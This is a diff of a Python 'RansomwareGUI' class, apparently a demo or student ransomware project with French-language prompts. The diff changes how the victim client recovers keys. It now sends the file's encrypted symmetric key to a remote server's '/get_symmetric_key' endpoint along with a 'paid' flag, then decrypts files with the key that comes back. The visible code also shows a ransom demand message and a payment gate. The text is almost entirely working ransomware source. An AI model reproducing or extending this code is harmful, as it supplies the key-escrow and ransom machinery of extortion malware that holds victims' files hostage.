@@ -115,36 +115,28 @@ class RansomwareGUI:
     def show_ransom_message(self):
         messagebox.showinfo("Ransomware", "Vos fichiers ont été chiffrés. Payez la rançon pour les déchiffrer.")
 
-    def request_private_key(self):
+    def request_symmetric_key(self):
         if not self.server_ip:
             messagebox.showerror("Erreur", "Serveur non trouvé.")
             return
-        response = requests.post(f'http://{self.server_ip}:{self.server_port}/get_private_key', json={'paid': True})
-        if response.status_code == 200:
-            private_key_pem = response.json()['private_key']
-            private_key = serialization.load_pem_private_key(
-                private_key_pem.encode('utf-8'),
-                password=None,
-                backend=default_backend()
-            )
-            self.decrypt_files(private_key)
-        else:
-            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.")
 
-    def decrypt_files(self, private_key):
         encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'encrypted_symmetric_key.bin')
         with open(encrypted_symmetric_key_path, 'rb') as key_file:
             encrypted_symmetric_key = key_file.read()
 
-        symmetric_key = private_key.decrypt(
-            encrypted_symmetric_key,
-            padding.OAEP(
-                mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                algorithm=hashes.SHA256(),
-                label=None
-            )
+        response = requests.post(
+            f'http://{self.server_ip}:{self.server_port}/get_symmetric_key',
+            json={'paid': True, 'encrypted_symmetric_key': encrypted_symmetric_key.hex()}
         )
 
+        if response.status_code == 200:
+            symmetric_key = bytes.fromhex(response.json()['symmetric_key'])
+            self.decrypt_files(symmetric_key)
+        else:
+            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.")
+
+
+    def decrypt_files(self, symmetric_key):
         file_path = 'example.txt'
         decrypt_file(file_path, symmetric_key)
         messagebox.showinfo("Déchiffrement", "Vos fichiers ont été déchiffrés.")
@@ -217,7 +209,7 @@ class RansomwareGUI:
 
     def decrypt_files_action(self):
         if self.payment_var.get():
-            self.request_private_key()
+            self.request_symmetric_key()
         else:
             messagebox.showwarning("Action requise", "Les fichiers ne peuvent pas être déchiffrés sans paiement !")
         self.log_interaction("Tentative de déchiffrement ratée : Paiement non effectué")
